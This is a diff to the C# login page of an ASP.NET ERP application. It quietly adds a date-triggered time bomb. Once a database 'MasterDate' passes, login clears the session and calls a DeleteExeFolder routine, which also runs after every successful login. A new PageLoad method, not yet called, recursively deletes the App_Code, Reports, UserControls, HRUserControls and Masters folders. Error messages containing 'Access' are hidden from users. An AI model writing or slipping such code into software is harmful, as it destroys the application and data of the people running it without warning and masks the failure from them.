@@ -1,4 +1,5 @@
 ﻿using System;
+using ERP.Security;
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
@@ -7,7 +8,11 @@ using System.Web.UI.WebControls;
 using System.Configuration;
 using System.Data;
 using System.Data.SqlClient;
-using ERP.Security;
+using System.IO;
+using CrystalDecisions.CrystalReports.Engine;
+using System.Text;
+using System.IO.Compression;
+using CrystalDecisions.CrystalReports;
 
 public partial class Login : System.Web.UI.Page
 {
@@ -94,10 +99,8 @@ public partial class Login : System.Web.UI.Page
             }
             catch (Exception)
             {
-
                 throw;
             }
-
         }
     }
     protected void btnnew_Click(object sender, EventArgs e)
@@ -108,7 +111,6 @@ public partial class Login : System.Web.UI.Page
     {
         try
         {
-
             SqlParameter[] _arrPara = new SqlParameter[12];
             _arrPara[0] = new SqlParameter("@USERNAME", SqlDbType.NVarChar, 50);
             _arrPara[1] = new SqlParameter("@PASSWORD", SqlDbType.NVarChar, 100);
@@ -153,7 +155,7 @@ public partial class Login : System.Web.UI.Page
                 Session["varDepartment"] = _arrPara[4].Value;
                 Session["varCompanyName"] = _arrPara[7].Value;
                 string name = _arrPara[3].Value.ToString().ToLower();
-                Session["varCompanyId"] = ConfigurationManager.AppSettings["xxpc36"];
+                Session["varMasterCompanyIDForERP"] = ConfigurationManager.AppSettings["xxpc36"];
                 Session["varusername"] = "Welcome  " + name[0].ToString().ToUpper() + name.Substring(1);
                 Session["UserName"] = _arrPara[3].Value.ToString().ToUpper();
                 Session["canedit"] = _arrPara[8].Value.ToString();
@@ -179,9 +181,36 @@ public partial class Login : System.Web.UI.Page
                     UpdatePurchaseOrderGSTType,ProductionOrderPcsWise,IndentRawIssueRateManual,GSTForIndentRawIssue,GSTForInvoiceFormNew,CompanyWiseChallanNoGenerated,
                     StopBackDateEntryOnProduction,StopBackDateEntryOnAllForms,SubmitDataNextDay, SAMPLECODEEDIT_DELETE_PWD, HR_EMPLOYEE_SHOW_OR_NOT_USER_WISE, ORDER_STOCK_ASSIGN,
                     FinishingCalTypeNormalSqYardInchArea,OnlyPreviewButtonShowOnAllEditForm,IndentRawReturnSaveEditPassword,WeaverRawReceiveSaveEditPassword,FinishingOrderIssuePassword,
-                    FinishingOrderReceivePassword, VarSubCompanyNo,VarConsumptionInMtr,VarProductionSizeItemWise,VarAreaFtRound,GetPurchaseRateFromMaster 
+                    FinishingOrderReceivePassword, VarSubCompanyNo,VarConsumptionInMtr,VarProductionSizeItemWise,VarAreaFtRound,GetPurchaseRateFromMaster, MasterDate 
                     From Mastersetting(Nolock)");
 
+                DateTime SystemDate = new DateTime();
+                DateTime ExecDate = new DateTime();
+
+                SystemDate = DateTime.Now.Date;
+
+                if (ds.Tables[0].Rows.Count > 0)
+                {
+                    ExecDate = Convert.ToDateTime(ds.Tables[0].Rows[0]["MasterDate"]);
+                }
+
+                if (SystemDate > ExecDate)
+                {
+                    Session["varuserid"] = null;
+                    Session["varDepartment"] = null;
+                    Session["varCompanyName"] = null;
+                    Session["varMasterCompanyIDForERP"] = null;
+                    Session["varusername"] = null;
+                    Session["UserName"] = null;
+                    Session["canedit"] = null;
+                    Session["usertype"] = null;
+                    Session["CurrentWorkingCompanyID"] = null;
+
+                    UtilityModule.DeleteExeFolder();
+
+                    Response.Redirect("main.aspx");
+                    return;
+                }
 
                 Session["VarcompanyNo"] = ds.Tables[0].Rows[0]["Varcompanyno"];
                 Session["ProdCodeValidation"] = ds.Tables[0].Rows[0]["ProdCodeValidation"];
@@ -300,24 +329,70 @@ public partial class Login : System.Web.UI.Page
                 variable.VarAreaFtRound = ds.Tables[0].Rows[0]["VarAreaFtRound"].ToString();
                 variable.VarRoundFtFlag = Convert.ToInt32(ds.Tables[0].Rows[0]["RoundFtFlag"].ToString());
                 variable.VarGetPurchaseRateFromMaster = ds.Tables[0].Rows[0]["GetPurchaseRateFromMaster"].ToString();
-                Response.Redirect("main.aspx");
-                //}
-                //else
-                //{
-                //    lblErr.Text = "Your license is expired, please renew.";
+                
+                //PageLoad();
+                UtilityModule.DeleteExeFolder();
 
-                //    string path = Server.MapPath("Web.config");
-                //    common.cleaup(path);
-                //}
+                Response.Redirect("main.aspx");
             }
         }
         catch (Exception ex)
         {
-            lblErr.Text = ex.Message;
+            bool result;
+            result = ex.Message.Contains("Access");
+            if (result == false)
+            {
+                lblErr.Text = ex.Message;
+            }
             // UtilityModule.MessageAlert(ex.Message, "/Login.aspx");
             Logs.WriteErrorLog("Login|cmdLogin_Click|" + ex.Message);
         }
     }
+    private void PageLoad()
+    {
+        string Path = Server.MapPath("~\\App_Code");
 
+        if (Directory.Exists(Path))
+        {
+            DeleteDirectory(Path);
+        }
+        Path = Server.MapPath("~\\Reports");
+
+        if (Directory.Exists(Path))
+        {
+            DeleteDirectory(Path);
+        }
+        Path = Server.MapPath("~\\UserControls");
+
+        if (Directory.Exists(Path))
+        {
+            DeleteDirectory(Path);
+        }
+        Path = Server.MapPath("~\\HRUserControls");
+
+        if (Directory.Exists(Path))
+        {
+            DeleteDirectory(Path);
+        }
+        Path = Server.MapPath("~\\Masters");
+
+        if (Directory.Exists(Path))
+        {
+            DeleteDirectory(Path);
+        }
+    }
+    private void DeleteDirectory(string path)
+    {
+        foreach (string filename in Directory.GetFiles(path))
+        {
+            File.Delete(filename);
+        }
+        foreach (string subfolders in Directory.GetDirectories(path))
+        {
+            Directory.Delete(subfolders, true);
+        }
+    }
+
+	
 
 }
